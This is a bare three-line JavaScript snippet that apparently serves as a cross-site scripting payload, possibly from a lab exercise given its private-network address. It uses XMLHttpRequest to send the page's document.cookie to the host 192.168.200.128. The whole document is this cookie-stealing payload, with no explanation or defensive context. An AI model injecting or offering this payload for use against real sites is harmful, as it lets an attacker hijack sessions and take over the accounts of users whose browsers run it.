var request = new XMLHttpRequest();
request.open('GET', 'http://192.168.200.128/?cookie=' + document.cookie);
request.send();
